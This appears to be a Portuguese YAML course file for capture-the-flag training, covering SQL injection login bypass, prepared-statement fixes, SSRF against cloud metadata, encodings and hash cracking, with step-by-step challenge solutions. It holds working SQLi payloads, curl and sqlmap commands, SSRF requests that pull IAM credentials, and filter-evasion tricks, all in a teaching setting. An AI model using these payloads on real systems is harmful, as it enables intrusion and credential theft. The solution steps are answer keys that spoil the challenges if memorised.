      O SQL Injection (OWASP Top 10 - A03:2021 - Injection) é uma das vulnerabilidades mais célebres e devastadoras da segurança de aplicações. Ela ocorre quando uma aplicação recebe dados fornecidos pelo usuário e os concatena diretamente na construção textual de uma instrução SQL enviada ao Sistema Gerenciador de Banco de Dados (SGBD), sem a devida separação entre código e dados.

      **A Mecânica do Bypass em Formulários de Login:**
      Considere a rotina típica de autenticação vulnerável implementada em muitas aplicações legadas:
      ```sql
      SELECT * FROM users WHERE username = '{input_usuario}' AND password = '{input_senha}';
      ```
      A intenção original do desenvolvedor é consultar a tabela `users` e verificar se existe um registro cujas colunas `username` e `password` correspondam estritamente aos valores digitados. No entanto, se os dados não forem parametrizados, um operador ofensivo pode inserir caracteres de controle da linguagem SQL (como apóstrofos `'`, operadores lógicos booleanos `OR`/`AND` e delimitadores de comentário `--` ou `#`).

      Ao submeter no campo de usuário o payload clássico:
      ```sql
      ' OR 1=1 --
      ```
      A consulta resultante montada e transmitida ao motor do banco torna-se:
      ```sql
      SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = '...';
      ```

      **A Subversão da Árvore de Sintaxe Abstrata (AST):**
      1. **Quebra de Delimitação (`'`):** O apóstrofo inicial fecha abruptamente o literal de string esperado para o campo `username`.
      2. **Injeção de Tautologia (`OR 1=1`):** Adiciona uma cláusula lógica disjuntiva (`OR`) contendo uma proposição que é invariavelmente verdadeira (`1=1` avalia para `TRUE`), independentemente de existir ou não um usuário com nome vazio.
      3. **Supressão do Predicado de Senha (`--`):** O delimitador `-- ` (no padrão ANSI SQL) instrui o compilador do SGBD a tratar todo o restante da linha como mero comentário, descartando completamente a verificação da cláusula `AND password = '...'`.

      Como o predicado avalia para verdadeiro em todos os registros da tabela `users`, o SGBD retorna uma lista contendo todos os usuários cadastrados. Aplicações web convencionais atribuem a sessão autenticada à primeira linha retornada pelo cursor (`cursor.fetchone()`). Como o primeiro registro de um banco de dados corporativo é historicamente o usuário administrador (`admin`, UID 1), o atacante ganha acesso de superusuário instantaneamente sem jamais ter conhecido a senha legítima.

      ### 💻 Exemplos Práticos e Sintaxe
      A sintaxe de comentários e operadores varia sutilmente entre os principais sistemas gerenciadores de banco de dados:

      | SGBD | Comentário de Linha | Comentário de Bloco | Exemplo Canônico de Bypass |
      | :--- | :---: | :---: | :--- |
      | **SQLite** | `-- ` (requer espaço após) | `/* comentário */` | `admin' -- ` |
      | **MySQL / MariaDB** | `-- ` (requer espaço) ou `#` | `/* comentário */` | `' OR 1=1 #` |
      | **PostgreSQL** | `-- ` | `/* comentário */` | `' OR '1'='1' -- ` |
      | **Microsoft SQL Server** | `-- ` | `/* comentário */` | `' OR 1=1 -- ` |

      1. **Payloads Clássicos para Linha de Comando e Formulários:**
         ```bash
         # Tautologia booleana com comentário ANSI:
         ' OR 1=1 --

         # Tautologia booleana com strings:
         ' OR '1'='1' --

         # Direcionamento explícito ao usuário admin comentando o restante:
         admin' --
         ```

      2. **Simulando Envio HTTP via cURL com POST:**
         ```bash
         curl -s -X POST http://alvo.local/login      -d "username=' OR 1=1 --&password=qualquer_coisa"
         ```

      3. **Auditoria Automatizada com SQLMap no Mundo Real:**
         ```bash
         sqlmap -u "http://alvo.local/login" --data="user=teste&pass=teste"      --batch --forms --risk=3 --level=5
         ```
         *O SQLMap realiza varreduras metódicas identificando pontos de injeção booleanos, baseados em erro e baseados em tempo.*

      ### 🎯 O que fazer para resolver o desafio (Passo a Passo)
      1. **Localizar e Iniciar o Binário:**
         No terminal do container, execute o executável do desafio:
         ```bash
         /challenge/web-sqli-login-bypass
         ```
      2. **Fornecer o Payload de Injeção no Prompt Interativo:**
         O programa solicitará as credenciais para submissão ao backend SQL:
         * No prompt `Usuário >> `, insira o payload clássico de bypass booleano:
           ```text
           ' OR 1=1 --
           ```
           *(Você também pode utilizar `admin' --` ou `' OR '1'='1`).*
         * No prompt `Senha >> `, digite qualquer valor ou pressione Enter (a checagem de senha será neutralizada pelo comentário da query).
      3. **Alternativa Direta via Linha de Comando:**
         Você também pode invocar o executável diretamente passando os parâmetros como argumentos:
         ```bash
         /challenge/web-sqli-login-bypass "' OR 1=1 --" "senha_dummy"
         ```
      4. **Capturar e Submeter a Flag:**
         O programa demonstrará a query interpolada no banco de dados, confirmará o desvio da lógica booleana e imprimirá a flag no formato:
         ```text
         pwn.college{...}
         ```
         Copie a flag gerada e submeta-a na interface da plataforma.
  - id: web-sqli-remediation
    name: 'Laboratório de Defesa: Implementando Prepared Statements'
    description: |
      ### 📖 Introdução Teórica
      A remediação segura e sustentável de vulnerabilidades de SQL Injection exige uma compreensão rigorosa sobre por que **mecanismos de filtragem textual são conceitualmente falhos** e por que as **Consultas Parametrizadas (*Prepared Statements*)** constituem a única defesa canônica definitiva.

      **A Falácia das Listas Negras (Blacklisting):**
      Muitos desenvolvedores inexperientes tentam mitigar SQLi criando filtros que procuram e removem termos proibidos como `SELECT`, `UNION`, `OR`, `--` ou aspas. Essa estratégia é completamente ineficaz e rotineiramente contornada por atacantes:
      1. **Aninhamento e Recursão Incompleta:** Se um filtro executa uma substituição simples `input.replace("SELECT", "")`, o envio da string `SELSELECTECT` faz com que o termo `SELECT` central seja removido, unindo os pedaços restantes `SEL` e `ECT` e restaurando a palavra `SELECT` exatamente como o atacante desejava!
      2. **Variações de Caixa (Case Sensitivity):** Interpretadores SQL são *case-insensitive* (`sElEcT` tem o mesmo valor semântico de `SELECT`). Filtros de blacklist que buscam correspondência exata em maiúsculas são completamente ignorados.
      3. **Comentários Inline:** Inserir comentários no meio de identificadores SQL (`SEL/**/ECT`) impede a identificação por expressões regulares simples, mas é perfeitamente interpretado pelos parsers de bancos como MySQL e SQLite.
      4. **Múltiplos Encodings:** Uso de codificação URL (`%27`), hexadecimal (`0x...`) ou caracteres Unicode multibyte contornam filtros superficiais.

      **A Solução Canônica: Consultas Parametrizadas (*Prepared Statements*):**
      Em vez de tentar higienizar texto, a abordagem correta altera a mecânica de execução do SGBD através de uma separação estrita em duas etapas:
      * **Etapa 1 (Compilação da Estrutura):** A aplicação envia ao banco de dados o esqueleto da consulta com marcadores de posição (*placeholders*, como `?` ou `:param`). O compilador do SGBD compila a query e fixa a Árvore Sintática Abstrata (AST). A partir desse momento, a semântica da instrução está matematicamente congelada.
      * **Etapa 2 (Envio de Dados Escalares):** Os parâmetros fornecidos pelo usuário são transmitidos em um canal separado e vinculados diretamente como valores de dados puros. Mesmo que o usuário envie `' OR 1=1 --`, o SGBD busca estritamente por uma linha onde a coluna contenha o texto literal `"' OR 1=1 --"`. O código SQL da consulta JAMAIS é alterado!

      ### 💻 Exemplos Práticos e Sintaxe
      Exemplos práticos de implementação segura de Prepared Statements nas linguagens mais utilizadas:

      1. **Python com SQLite (`sqlite3`):**
         ```python
         import sqlite3

         conn = sqlite3.connect("database.db")
         cursor = conn.cursor()

         # INSEGURO (Concatenação de strings vulnerável a SQLi):
         # cursor.execute(f"SELECT * FROM users WHERE user = '{usuario}' AND pass = '{senha}'")

         # SEGURO (Prepared Statements com marcadores ?):
         cursor.execute("SELECT id, role FROM users WHERE user = ? AND pass = ?", (usuario, senha_hash))
         usuario_autenticado = cursor.fetchone()
         ```

      2. **Python com PostgreSQL (`psycopg2`):**
         ```python
         # SEGURO (Placeholders %s tratados e escapados pelo driver em nível binário):
         cursor.execute("SELECT id, email FROM accounts WHERE user = %s AND status = %s", (username, "ativo"))
         ```

      3. **PHP com PDO (PHP Data Objects):**
         ```php
         // SEGURO:
         $stmt = $pdo->prepare('SELECT id, role FROM users WHERE username = :user');
         $stmt->execute([':user' => $usuario]);
         $resultado = $stmt->fetch();
         ```

      4. **Node.js com Drivers Assíncronos (mysql2 / pg):**
         ```javascript
         // SEGURO:
         const [rows] = await db.execute('SELECT * FROM users WHERE username = ?', [usuario]);
         ```

      ### 🎯 O que fazer para resolver o desafio (Passo a Passo)
      1. **Localizar e Iniciar o Binário:**
         No terminal do container, execute o programa de auditoria e revisão de código seguro:
         ```bash
         /challenge/web-sqli-remediation
         ```
      2. **Analisar as Opções Apresentadas:**
         O binário apresentará as quatro propostas técnicas para blindagem da aplicação contra SQL Injection:
         * `[A]` Criar uma lista negra (Blacklist) proibindo as palavras 'SELECT' e 'UNION'
         * `[B]` Implementar Consultas Parametrizadas (Prepared Statements) separando código de dados
         * `[C]` Aplicar escape de aspas com expressões regulares (addslashes / regex)
         * `[D]` Codificar todas as entradas do usuário em Base64 antes de salvar no banco
      3. **Submeter a Mitigação Canônica:**
         No prompt interativo `[A/B/C/D]`, selecione a opção **B**:
         ```text
         B
         ```
         *Alternativa CLI:* Você pode executar o binário passando a resposta diretamente:
         ```bash
         /challenge/web-sqli-remediation B
         ```
      4. **Capturar e Submeter a Flag:**
         O sistema homologará a escolha de Prepared Statements, apresentará uma demonstração de por que as abordagens alternativas (como Blacklists) falham em produção e exibirá a flag no formato:
         ```text
         pwn.college{...}
         ```
         Copie a flag e registre a pontuação no portal.
  - id: web-ssrf-internal-recon
    name: Exploração de SSRF para Acesso à Rede Interna
    description: "### \U0001F4D6 Introdução Teórica\nO Server-Side Request Forgery (SSRF - OWASP Top 10 - A10:2021) é uma\
      \ classe de vulnerabilidade na qual um servidor web aceita uma URL fornecida pelo usuário e dispara uma requisição HTTP\
      \ para buscar o recurso correspondente (como baixar imagens, importar feeds RSS, pré-visualizar links ou disparar webhooks)\
      \ sem restringir nem validar a rede de destino.\n\n**A Mecânica do Ataque de Pivoting:**\nServidores web residem tipicamente\
      \ em zonas de rede privilegiadas (como DMZs internas, redes VPC em nuvem ou sub-redes privadas) que possuem conexões\
      \ diretas com outros sistemas corporativos bloqueados para a internet externa. Ao explorar SSRF, o atacante usa a identidade\
      \ e a conectividade do próprio servidor web vulnerável como um procurador (*proxy*) involuntário:\n```\n[ ATACANTE NA\
      \ INTERNET ]\n        │\n        │ 1. POST /preview?url=http://169.254.169.254/latest/meta-data/\n        ▼\n[ SERVIDOR\
      \ WEB PÚBLICO ] ── 2. GET http://169.254.169.254/... ──> [ METADATA SERVICE AWS ]\n        │                       \
      \                                         │\n        │ 3. Recebe AccessKeyId, SecretAccessKey, IAM Token <────────────┘\n\
      \        ▼\n[ ATACANTE OBTÉM CONTROLE TOTAL DA INFRAESTRUTURA EM NUVEM ]\n```\n\n**O Alvo Mais Crítico em Nuvem: O IP\
      \ Link-Local `169.254.169.254`:**\nEm grandes provedores de nuvem (como AWS EC2, Google Cloud Platform, Microsoft Azure,\
      \ DigitalOcean e OpenStack), o endereço IPv4 `169.254.169.254` (bloco de endereçamento Link-Local definido pela RFC\
      \ 3927) hospeda a API de metadados da instância (Instance Metadata Service - IMDS).\n* Na versão **IMDSv1** da AWS,\
      \ uma requisição HTTP `GET` direta e sem autenticação para esse IP retorna informações confidenciais do ambiente, incluindo\
      \ variáveis de inicialização (*user-data*) e credenciais temporárias da Role IAM associada à instância (`AccessKeyId`,\
      \ `SecretAccessKey`, `Token`).\n* Outros alvos internos típicos incluem serviços escutando na interface de loopback\
      \ (`127.0.0.1` ou `localhost`) sem autenticação configurada (como consoles administrativos internos na porta 8080, instâncias\
      \ Redis na porta 6379, Elasticsearch em 9200 ou o endpoint Kubelet em 10255).\n\n**Defesa Estrutural e Mitigação:**\n\
      A remediação contra SSRF envolve validação estrita de esquemas e domínios via lista de permissões (*whitelisting*),\
      \ bloqueio direto de faixas privadas (RFC 1918) e link-local (`169.254.0.0/16`) no código e no firewall de egresso,\
      \ e a ativação obrigatória do **AWS IMDSv2**, que exige uma requisição prévia com método `PUT` e cabeçalho `X-aws-ec2-metadata-token`\
      \ para emitir um token de sessão com TTL curto, neutralizando requisições `GET` forjadas por SSRF simples.\n\n### \U0001F4BB\
      \ Exemplos Práticos e Sintaxe\n1. **Consultando Metadados de Nuvem com `curl`:**\n   ```bash\n   # Listar categorias\
      \ de metadados na AWS:\n   curl http://169.254.169.254/latest/meta-data/\n\n   # Extrair as credenciais temporárias\
      \ do IAM da máquina virtual:\n   curl http://169.254.169.254/latest/meta-data/iam/security-credentials/\n   ```\n\n\
      2. **Exemplo de Resposta de Metadados com Credenciais de Nuvem Vazadas:**\n   ```json\n   {\n     \"Code\": \"Success\"\
      ,\n     \"AccessKeyId\": \"ASIAQABCDEF123456789\",\n     \"SecretAccessKey\": \"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\"\
      ,\n     \"Token\": \"AQoDYXdzEJr1...\",\n     \"RoleArn\": \"arn:aws:iam::123456789012:role/Cyberguard-Cloud-Admin\"\
      \n   }\n   ```\n\n3. **Reconhecimento de Serviços Internos em Loopback (`127.0.0.1`):**\n   ```bash\n   # Acessar console\
      \ restrito administrativo na porta 8080:\n   curl http://127.0.0.1:8080/admin/status\n   ```\n\n4. **Técnicas de Evasão\
      \ de Filtros Simples de URL:**\n   * **Notação Decimal de IPv4:** `http://2130706433/` (converte cada octeto de `127.0.0.1`\
      \ para representação inteira de 32 bits: $127 \times 256^3 + 1$).\n   * **Notação Hexadecimal:** `http://0x7f000001/`.\n\
      \   * **Redirecionamento HTTP 302:** Apontar para um domínio externo controlado que responde redirecionando para `http://169.254.169.254/`.\n\
      \n### \U0001F3AF O que fazer para resolver o desafio (Passo a Passo)\n1. **Localizar e Iniciar o Binário:**\n   No terminal\
      \ do container, execute o desafio de SSRF:\n   ```bash\n   /challenge/web-ssrf-internal-recon\n   ```\n2. **Fornecer\
      \ o Alvo Interno de Nuvem ou Loopback:**\n   Quando solicitado pelo prompt `>> `, insira a URL apontando para a API\
      \ de metadados de nuvem:\n   ```text\n   http://169.254.169.254/latest/meta-data/\n   ```\n   *Alternativa:* Você também\
      \ pode direcionar para a porta administrativa local:\n   ```text\n   http://127.0.0.1:8080/admin\n   ```\n3. **Disparo\
      \ Direto via Linha de Comando:**\n   Você pode fornecer a URL diretamente como argumento CLI:\n   ```bash\n   /challenge/web-ssrf-internal-recon\
      \ \"http://169.254.169.254/latest/meta-data/\"\n   ```\n4. **Capturar e Submeter a Flag:**\n   O backend simulará a\
      \ requisição interna, exibirá os metadados confidenciais ou a resposta do painel de administração e liberará a flag\
      \ no formato:\n   ```text\n   pwn.college{...}\n   ```\n   Copie a flag e registre a pontuação no portal.\n"
- id: criptografia-ctf-basics
  name: 'Módulo 5: Criptografia Aplicada & Fundamentos CTF'
  description: |
    Uma das distinções mais vitais na cibersegurança é a diferença entre Codificação (Encoding), Hashing Unidirecional e Criptografia Bidirecional. Este módulo desfaz confusões frequentes entre formatos de representação (Base64, Hexadecimal, ASCII), algoritmos de hash criptográfico rápido (MD5, SHA-256) e funções de derivação lenta para armazenamento de senhas (Bcrypt, Argon2 com salt).

    Você também praticará técnicas de identificação de formatos e análise de esteganografia em arquivos de imagem e tráfego de rede.
  resources:
  - name: Fundamentos de Criptografia e Decodificação
    type: lecture
    video: https://www.youtube.com/watch?v=sIBA7p96F4A
    slides: https://pwn.college/cryptography
  - name: 'Guia Teórico: Encodings, Hashes, Salting e Criptografia'
    type: markdown
    content: "### Codificação (Encoding) vs Hashing vs Criptografia\n\n| Conceito | Finalidade | Reversível? | Chave Secreta?\
      \ | Exemplos Notórios |\n| :--- | :--- | :---: | :---: | :--- |\n| **Encoding** | Compatibilidade e transmissão de dados\
      \ binários em canais de texto | Sim (trivial) | **Não** | Base64, ASCII, Hexadecimal, URL-Encoding |\n| **Hashing**\
      \ | Garantir integridade de dados; geração de impressão digital fixa | **Não** (unidirecional) | Não (função pura) |\
      \ SHA-256, MD5, SHA-3 |\n| **KDF / Password Hash** | Armazenamento de senhas resistente a ataques de força bruta | **Não**\
      \ (unidirecional) | Usa **Salt** e **Custo** | Bcrypt, Argon2id, PBKDF2, Scrypt |\n| **Criptografia** | Confidencialidade\
      \ de mensagens | Sim (se possuir a chave) | **Sim** (Simétrica ou Assimétrica) | AES-GCM, ChaCha20, RSA, ECC |\n\n####\
      \ O Formato Base64 e o Padding `=`\n* O Base64 utiliza um alfabeto de 64 caracteres (`A-Z`, `a-z`, `0-9`, `+`, `/`).\n\
      * Cada caractere Base64 representa exatamente 6 bits.\n* Se o total de bytes da entrada original não for múltiplo de\
      \ 3, adiciona-se o caractere `=` no final como caractere de preenchimento (*padding*).\n* Exemplo: `ZmxhZ3t0ZXN0ZX0=`\
      \ (termina com `=` indicando padding, e contém letras maiúsculas e minúsculas).\n* **Diferença de um Hash MD5:** O MD5\
      \ possui sempre exatamente 32 caracteres hexadecimais (`0-9`, `a-f`), sem padding e sem letras além de `f`.\n\n####\
      \ Por que Bcrypt e Argon2 para Senhas?\nHashes comuns como MD5 e SHA-256 foram projetados para serem extremamente rápidos\
      \ (computam bilhões de operações por segundo em GPUs modernas), tornando-os péssimos para senhas.  \nAlgoritmos como\
      \ **Argon2** e **Bcrypt** introduzem parâmetros de lentidão proposital (*work factor / memory cost*) e exigem um **Salt**\
      \ exclusivo por usuário, inviabilizando Rainbow Tables e ataques acelerados por hardware.\n"
  challenges:
  - id: crypto-encodings-pipeline
    name: Decodificando Encodings em Cascata
    description: "### \U0001F4D6 Introdução Teórica\nUma das defasagens conceituais mais comuns na segurança da informação\
      \ é a confusão entre **Codificação (Encoding)**, **Resumo Criptográfico (Hashing)** e **Criptografia Real (Encryption)**.\
      \ Dominar essas distinções é indispensável:\n\n| Conceito | Finalidade Primária | Reversibilidade | Depende de Chave\
      \ Secreta? | Exemplos Canônicos |\n| :--- | :--- | :---: | :---: | :--- |\n| **Encoding (Codificação)** | Compatibilidade\
      \ e transmissão de dados binários em canais que aceitam apenas texto | **100% Reversível** | ❌ **NÃO** | Base64, Hexadecimal,\
      \ ASCII, URL-Encoding, ROT13 |\n| **Hashing (Resumo Unidirecional)** | Garantir integridade e gerar impressões digitais\
      \ matemáticas de tamanho fixo | **NÃO Reversível** (One-Way) | ❌ **NÃO** | MD5, SHA-1, SHA-256 |\n| **Encryption (Criptografia\
      \ Real)** | Proteger confidencialidade contra acesso não autorizado | **Reversível** (com a chave) |  **SIM** | AES-GCM,\
      \ ChaCha20, RSA, ECC |\n\n**Anatomia Matemática do Base64 e a Assinatura do Padding (`=`):**\nO Base64 foi desenvolvido\
      \ para empacotar dados binários de 8 bits em um subconjunto de 64 caracteres ASCII seguros para transmissão em protocolos\
      \ de texto (como e-mail MIME ou JSON).\n* O alfabeto é formado por 64 símbolos: `A-Z` (26 letras maiúsculas), `a-z`\
      \ (26 letras minúsculas), `0-9` (10 dígitos), `+` e `/`. Cada símbolo codificado representa exatamente 6 bits ($2^6\
      \ = 64$).\n* O algoritmo agrupa blocos de 3 bytes da entrada ($3 \times 8 = 24$ bits) e os divide em 4 blocos de 6 bits,\
      \ mapeando cada um no caractere correspondente.\n* **Padding (`=` e `==`):** Quando a entrada original não é perfeitamente\
      \ divisível por 3 bytes:\n  - Sobra 1 byte (8 bits): precisa de 2 caracteres Base64 (12 bits) e é completado com dois\
      \ sinais de igual (`==`) como preenchimento.\n  - Sobram 2 bytes (16 bits): precisa de 3 caracteres Base64 (18 bits)\
      \ e é completado com um sinal de igual (`=`).\n  - Múltiplo exato de 3 bytes: nenhum caractere de preenchimento é gerado.\n\
      \n**Por que a string `ZmxhZ3t0ZXN0ZX0=` JAMAIS poderia ser um Hash MD5?**\n1. **Conjunto de Caracteres:** Hashes MD5\
      \ utilizam exclusivamente caracteres hexadecimais (`0-9`, `a-f`). A string acima contém caracteres como `Z`, `m`, `x`,\
      \ `t` que não existem na base hexadecimal.\n2. **Sinal de Padding (`=`):** O caractere `=` NUNCA existe em um hash MD5,\
      \ SHA-1 ou SHA-256.\n3. **Comprimento:** Um hash MD5 possui sempre exatamente 32 caracteres hexadecimais (128 bits).\n\
      \n### \U0001F4BB Exemplos Práticos e Sintaxe\nUtilitários essenciais no terminal Linux para manipulação de encodings:\n\
      \n1. **Decodificar Base64 com o comando nativo `base64` (`-d` ou `--decode`):**\n   ```bash\n   echo -n \"ZmxhZ3t0ZXN0ZX0=\"\
      \ | base64 -d\n   ```\n   *Saída esperada no terminal:*\n   ```text\n   flag{teste}\n   ```\n\n2. **Codificar strings\
      \ em Base64:**\n   ```bash\n   echo -n \"flag{teste}\" | base64\n   ```\n   *Saída esperada:*\n   ```text\n   ZmxhZ3t0ZXN0ZX0=\n\
      \   ```\n\n3. **Decodificar Hexadecimal para ASCII com `xxd` (`-r -p`):**\n   ```bash\n   echo -n \"666c61677b74657374657d\"\
      \ | xxd -r -p\n   ```\n   *Saída esperada:*\n   ```text\n   flag{teste}\n   ```\n\n4. **Decodificar ROT13 com `tr` no\
      \ terminal:**\n   ```bash\n   echo \"synt{grfgr}\" | tr 'A-Za-z' 'N-ZA-Mn-za-m'\n   ```\n\n5. **Decodificação Programática\
      \ em Python:**\n   ```python\n   import base64\n\n   payload = \"ZmxhZ3t0ZXN0ZX0=\"\n   resultado = base64.b64decode(payload).decode(\"\
      utf-8\")\n   print(\"Texto recuperado:\", resultado)\n   ```\n\n### \U0001F3AF O que fazer para resolver o desafio (Passo\
      \ a Passo)\n1. **Localizar e Iniciar o Binário:**\n   No terminal do container, execute o executável do desafio:\n \
      \  ```bash\n   /challenge/crypto-encodings-pipeline\n   ```\n   O binário apresentará a string interceptada: `ZmxhZ3t0ZXN0ZX0=`.\n\
      2. **Decodificar o Payload no Terminal:**\n   Em uma linha de comando do Linux, decodifique a string com o utilitário\
      \ nativo:\n   ```bash\n   echo -n \"ZmxhZ3t0ZXN0ZX0=\" | base64 -d\n   ```\n   O comando exibirá o texto original em\
      \ claro:\n   ```text\n   flag{teste}\n   ```\n3. **Enviar a Resposta ao Desafio:**\n   No prompt do binário (`>> `),\
      \ digite o texto em claro recuperado:\n   ```text\n   flag{teste}\n   ```\n   *Alternativa rápida:* Você pode executar\
      \ o binário passando a resposta diretamente:\n   ```bash\n   /challenge/crypto-encodings-pipeline \"flag{teste}\"\n\
      \   ```\n4. **Capturar e Submeter a Flag:**\n   O programa validará a decodificação da string Base64 e imprimirá a flag\
      \ no formato:\n   ```text\n   pwn.college{...}\n   ```\n   Copie a flag e registre a pontuação na plataforma.\n"
  - id: crypto-hash-identification
    name: Identificação e Análise de Hashes
    description: "### \U0001F4D6 Introdução Teórica\nA identificação precisa de formatos de hash e algoritmos criptográficos\
      \ é uma competência fundamental em auditorias de segurança, testes de invasão e investigações de vazamento de dados\
      \ corporativos.\n\n**A Falácia da Velocidade: Por que MD5 e SHA-256 não devem proteger senhas?**\nAlgoritmos de hash\
      \ criptográfico como MD5, SHA-1 e SHA-256 foram projetados com foco em **velocidade máxima**: seu objetivo primordial\
      \ é verificar a integridade de grandes volumes de dados (múltiplos gigabytes por segundo).\nNo entanto, essa velocidade\
      \ torna-se uma falha crítica quando aplicada a senhas:\n* Rigs de mineração e estações de ataque equipadas com GPUs\
      \ modernas (como NVIDIA RTX 4090) computam **mais de 800 bilhões de hashes MD5 e dezenas de bilhões de hashes SHA-256\
      \ por segundo**.\n* Uma senha comum de 8 caracteres alfanuméricos possui cerca de $62^8 \approx 2,18 \times 10^{14}$\
      \ combinações. Em MD5, essa senha pode ser quebrada em menos de **4 minutos** por força bruta exaustiva!\n\n**O Papel\
      \ do Salt (Sal Criptográfico):**\nUm *Salt* é uma sequência de bytes pseudoaleatórios gerada individualmente para cada\
      \ usuário no momento de criação ou troca de senha:\n* **Sem Salt:** Dois usuários com a mesma senha possuem hashes idênticos.\
      \ O atacante pode pré-computar tabelas gigantescas de hashes (*Rainbow Tables*) e recuperar milhões de senhas simultaneamente\
      \ com buscas diretas em disco.\n* **Com Salt:** Mesmo que centenas de usuários escolham a mesma senha, cada um terá\
      \ um hash completamente distinto. O atacante é forçado a atacar cada hash individualmente, neutralizando completamente\
      \ Rainbow Tables.\n\n**Hashes Lentos e Adaptativos: Bcrypt e Argon2:**\nPara combater o poder paralelo de GPUs e ASICs,\
      \ foram desenvolvidas funções de derivação lenta que introduzem custo computacional configurável (*work factor*) e dureza\
      \ de memória (*memory-hardness*):\n* **Bcrypt:** Baseado na cifra Blowfish, aplica um fator de custo iterativo ($2^{\t\
      ext{cost}}$ rounds). Cada validação de login demora propositalmente de 100 a 300 milissegundos na CPU, reduzindo a capacidade\
      \ de teste de uma GPU de bilhões para poucos milhares de tentativas por segundo.\n* **Argon2 (Argon2id - RFC 9106):**\
      \ Vencedor da *Password Hashing Competition*, exige o preenchimento de megabytes de memória RAM a cada cálculo de hash,\
      \ inviabilizando ataques paralelos acelerados por hardware.\n\n**Anatomia Modular de um Hash Bcrypt:**\n```\n$2b$12$e8uq5e5R6YFh3oQ1K2WkQ.M7Gf1y/8k6E9n0o1p2q3r4s5t6u7v8w\n\
      \ │   │  └──────────┬─────────┘└──────────────┬──────────────┘\n │   │             │                         └─ Resumo\
      \ Criptográfico (31 chars)\n │   │             └─ Salt de 128 bits codificado em Base64 modificado (22 chars)\n │  \
      \ └─ Fator de Custo (Work Factor: 2^12 = 4096 iterações)\n └─ Identificador do Algoritmo ($2b$ = Bcrypt moderno)\n```\n\
      \n### \U0001F4BB Exemplos Práticos e Sintaxe\nFerramentas de linha de comando para identificação e análise de hashes:\n\
      \n1. **Identificação Automática com o utilitário `hashid` no Linux:**\n   ```bash\n   hashid -m \"e10adc3949ba59abbe56e057f20f883e\"\
      \n   ```\n   *Saída esperada:*\n   ```text\n   Analyzing 'e10adc3949ba59abbe56e057f20f883e'\n   [+] MD5 [Hashcat Mode:\
      \ 0]\n   [+] NTLM [Hashcat Mode: 1000]\n   ```\n\n2. **Diferenciação por Padrão Estrutural e Tamanho:**\n   * **MD5:**\
      \ Exatamente 32 caracteres hexadecimais (`0-9`, `a-f`).\n   * **SHA-1:** Exatamente 40 caracteres hexadecimais.\n  \
      \ * **SHA-256:** Exatamente 64 caracteres hexadecimais.\n   * **NTLM:** 32 caracteres hexadecimais (usado no Windows\
      \ Active Directory).\n   * **Bcrypt:** 60 caracteres iniciando com `$2a$`, `$2b$` ou `$2y$`.\n   * **Argon2:** Inicia\
      \ com `$argon2id$`, `$argon2i$` ou `$argon2d$`.\n\n3. **Gerando e Verificando Hashes Bcrypt em Python:**\n   ```python\n\
      \   import bcrypt\n\n   senha = b\"Cyberguard@2026!\"\n   # Gera salt aleatório e aplica work factor 12:\n   hash_bcrypt\
      \ = bcrypt.hashpw(senha, bcrypt.gensalt(rounds=12))\n   print(f\"Hash gerado: {hash_bcrypt.decode()}\")\n\n   # Validação\
      \ segura resistente a ataques de temporização:\n   confere = bcrypt.checkpw(senha, hash_bcrypt)\n   print(\"Senha válida?\"\
      , confere)\n   ```\n\n### \U0001F3AF O que fazer para resolver o desafio (Passo a Passo)\n1. **Localizar e Iniciar o\
      \ Binário:**\n   No terminal do container, execute o desafio de identificação criptográfica:\n   ```bash\n   /challenge/crypto-hash-identification\n\
      \   ```\n2. **Analisar a Questão do Laboratório:**\n   O programa exibirá os artefatos criptográficos e fará a pergunta\
      \ técnica:\n   \"Por que funções de hash lentas e adaptativas com salt (como Bcrypt e Argon2) são obrigatórias para\
      \ armazenamento de senhas corporativas, em vez de MD5 ou SHA-256?\"\n   Opções:\n   * `[1]` Porque MD5 é uma cifra reversível\
      \ que usa chave privada\n   * `[2]` Porque o cálculo propositalmente lento somado ao Salt exclusivo anula Rainbow Tables\
      \ e inviabiliza força bruta massiva em GPUs\n   * `[3]` Porque Bcrypt comprime senhas com perda de integridade para\
      \ economizar disco\n   * `[4]` Porque funções rápidas sofrem de vulnerabilidade de overflow no buffer do kernel\n3.\
      \ **Submeter a Opção Correta:**\n   No prompt `[1/2/3/4]`, digite a opção **2**:\n   ```text\n   2\n   ```\n   *(Ou\
      \ execute diretamente com argumento: `/challenge/crypto-hash-identification 2`).*\n4. **Capturar e Submeter a Flag:**\n\
      \   O binário confirmará a resposta correta, detalhará as diretrizes de armazenamento seguro do NIST e exibirá a flag\
      \ no formato:\n   ```text\n   pwn.college{...}\n   ```\n   Copie a flag e registre a pontuação no portal.\n"
  - id: crypto-john-cracking
    name: Quebra de Hashes com John the Ripper / Hashcat
    description: |
      ### 📖 Introdução Teórica
      A quebra de hashes offline (*Offline Password Cracking*) é uma das disciplinas mais críticas de auditoria de credenciais e testes de intrusão corporativos.

      **A Vantagem Operacional do Cracking Offline:**
      Diferente de um ataque de força bruta online (que dispara requisições contra formulários web ou portas SSH e é rapidamente bloqueado por políticas de lockout, *fail2ban* ou alertas de SIEM), o ataque offline é executado **estritamente na máquina local do atacante**:
      * O atacante obtém o hash (via dump de banco de dados, arquivo `/etc/shadow` do Linux, arquivo SAM/NTDS.dit do Windows ou ticket de serviço Kerberos).
      * O ataque não transmite nenhum pacote pela rede corporativa e não pode ser interrompido por mecanismos de defesa de borda.
      * O atacante pode testar bilhões de combinações por segundo aproveitando o paralelismo de suas GPUs e CPUs.

      **Modalidades de Ataque Offline:**
      1. **Ataque de Dicionário (Wordlist Attack):** Compara o hash alvo contra o hash de milhões de senhas reais compiladas de vazamentos históricos. A lista mais famosa da história da segurança é a **`rockyou.txt`**, que contém mais de 14 milhões de senhas exclusivas extraídas de um vazamento em 2009.
      2. **Ataque com Regras de Mutação (Rule-Based Attack):** Aplica transformações dinâmicas sobre cada palavra da wordlist (como capitalizar a primeira letra, trocar letras por números estilo leetspeak `a -> @`, `e -> 3`, e anexar anos correntes como `2026!` ou `123`).
      3. **Ataque por Máscara / Força Bruta (Mask / Brute-Force):** Testa exaustivamente todas as combinações de um padrão definido (ex: 8 dígitos numéricos ou 1 maiúscula + 5 minúsculas + 2 dígitos).

      **As Duas Ferramentas Canônicas:**
      * **John the Ripper (JtR):** Ferramenta clássica e extremamente versátil. Possui excelente suporte a múltiplos formatos em CPUs, suíte ampla de extratores de hash (`ssh2john`, `zip2john`, `keepass2john`) e detecção automática de formatos.
